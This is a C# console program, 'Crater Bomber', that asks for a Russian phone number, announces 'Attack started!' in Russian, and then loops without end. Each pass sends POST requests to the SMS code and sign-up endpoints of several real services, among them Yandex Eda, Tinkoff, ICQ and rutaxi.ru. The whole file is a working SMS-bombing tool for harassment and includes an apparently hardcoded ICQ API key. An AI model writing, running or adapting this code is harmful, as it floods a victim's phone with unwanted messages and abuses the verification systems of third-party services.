using System;
using System.Net;
using System.Collections.Specialized;

namespace Crater_Bomber
{
    class Program
    {
        static void Main(string[] args)
        {
            ConsoleColor[] colors = (ConsoleColor[])ConsoleColor.GetValues(typeof(ConsoleColor));
            ConsoleColor currentBackground = Console.BackgroundColor;
            ConsoleColor currentForeground = Console.ForegroundColor;
            Console.BackgroundColor = ConsoleColor.Yellow;
            Console.ForegroundColor = ConsoleColor.Black;
            Console.WriteLine(" You Background Console Color(BCC): "+currentBackground+" ");
            Console.WriteLine(" You Foreground Console Color(FCC): "+currentForeground+"  ");
            Console.ResetColor();
            Console.WriteLine("\n");
            Console.BackgroundColor = ConsoleColor.Green;
            Console.ForegroundColor = ConsoleColor.Black;
            Console.WriteLine("        Program: Crater Bomber            ");
            Console.WriteLine("        Author: Top Programmer            ");
            Console.WriteLine("    Telegram Bot: @universal_info_bot     ");
            Console.ResetColor();
            Console.WriteLine("\n");
            Console.ForegroundColor = ConsoleColor.White;

            while (true)
            {
                Console.Write("Введите номер телефона (7##########): ");
                string phone = Console.ReadLine();
                bool true_phone = phone.Length == 11 && phone[0] == '7';

                if (true_phone)
                {                    
                    Console.BackgroundColor = ConsoleColor.Green;
                    Console.ForegroundColor = ConsoleColor.Black;
                    Console.WriteLine("Атака началась!");
                    Console.ResetColor();
                    int i = 0;
                    while (true) {
                        using (var wb_1 = new WebClient())
                        {
                            string url_1 = "https://youla.ru/web-api/auth/request_code";
                            var data_1 = new NameValueCollection();
                            data_1["phone"] = phone;
                            try
                            {
                                var response = wb_1.UploadValues(url_1, "POST", data_1);
                                ++i;
                                Console.WriteLine("Запрос успешно отправлен! Count: "+i);
                            }
                            catch (Exception){
                                Console.WriteLine("Не отправлено!");
                            }
                           
                            //string responseInString = Encoding.UTF8.GetString(response);
                        }

                        using (var wb_2 = new WebClient())
                        {
                            string url_2 = "https://eda.yandex/api/v1/user/request_authentication_code";
                            var data_2 = new NameValueCollection();
                            data_2["phone_number"] = "+" + phone;
                            try
                            {
                                var response = wb_2.UploadValues(url_2, "POST", data_2);
                                ++i;
                                Console.WriteLine("Запрос успешно отправлен! Count: " + i);
                            }
                            catch (Exception){
                                Console.WriteLine("Не отправлено!");
                            }
                            //string responseInString = Encoding.UTF8.GetString(response);
                        }

                        using (var wb_3 = new WebClient())
                        {
                            string url_3 = "https://rutaxi.ru/ajax_auth.html";
                            var data_3 = new NameValueCollection();
                            data_3["1"] = phone;
                            data_3["c"] = "3";
                            try
                            {
                                var response = wb_3.UploadValues(url_3, "POST", data_3);
                                ++i;
                                Console.WriteLine("Запрос успешно отправлен! Count: " + i);
                            }
                            catch (Exception) {
                                Console.WriteLine("Не отправлено!");
                            }
                            //string responseInString = Encoding.UTF8.GetString(response);
                        }

                        using (var wb_4 = new WebClient())
                        {
                            string url_4 = "https://rutaxi.ru/ajax_auth.html";
                            var data_4 = new NameValueCollection();
                            data_4["1"] = phone;
                            data_4["c"] = "3";

                            try
                            {
                                var response = wb_4.UploadValues(url_4, "POST", data_4);
                                ++i;
                                Console.WriteLine("Запрос успешно отправлен! Count: " + i);
                            }
                            catch (Exception) {
                                Console.WriteLine("Не отправлено!");
                            } 
                            //string responseInString = Encoding.UTF8.GetString(response);
                        }

                        using (var wb_5 = new WebClient())
                        {
                            string url_5 = "https://api.tinkoff.ru/v1/sign_up";
                            var data_5 = new NameValueCollection();
                            data_5["phone"] = "+"+phone;
                            try
                            {
                                var response = wb_5.UploadValues(url_5, "POST", data_5);
                                ++i;
                                Console.WriteLine("Запрос успешно отправлен! Count: " + i);
                            }
                            catch (Exception){
                                Console.WriteLine("Не отправлено!");
                            }
                            //string responseInString = Encoding.UTF8.GetString(response);
                        }

                        using (var wb_6 = new WebClient())
                        {
                            string url_6 = "https://www.icq.com/smsreg/requestPhoneValidation.php";
                            var data_6 = new NameValueCollection();
                            data_6["msisdn"] = phone;
                            data_6["locale"] = "en";
                            data_6["countryCode"] = "ru";
                            data_6["version"] = "1";
                            data_6["k"] = "ic1rtwz1s1Hj1O0r";
                            data_6["r"] = "46763";

                            try
                            {
                                var response = wb_6.UploadValues(url_6, "POST", data_6);
                                ++i;
                                Console.WriteLine("Запрос успешно отправлен! Count: " + i);
                            }
                            catch (Exception) {
                                Console.WriteLine("Не отправлено!");
                            }
                            //string responseInString = Encoding.UTF8.GetString(response);
                        }

                        using (var wb_7 = new WebClient())
                        {
                            string url_7 = "https://api.delitime.ru/api/v2/signup";
                            var data_7 = new NameValueCollection();
                            data_7["SignupForm[username]"] = phone;
                            data_7["SignupForm[device_type]"] = "3";

                            try
                            {
                                var response = wb_7.UploadValues(url_7, "POST", data_7);
                                ++i;
                                Console.WriteLine("Запрос успешно отправлен! Count: " + i);
                            }
                            catch (Exception) {
                                Console.WriteLine("Не отправлено!");
                            }
                            //string responseInString = Encoding.UTF8.GetString(response);
                        }
                    }
                }
                else
                {
                    Console.BackgroundColor = ConsoleColor.Red;
                    Console.ForegroundColor = ConsoleColor.Black;
                    Console.WriteLine("\n");
                    Console.WriteLine("Номер телефона веден неправильно!");
                    Console.WriteLine("\n");
                    Console.ResetColor();                   
                }
            }
        }
    }
}
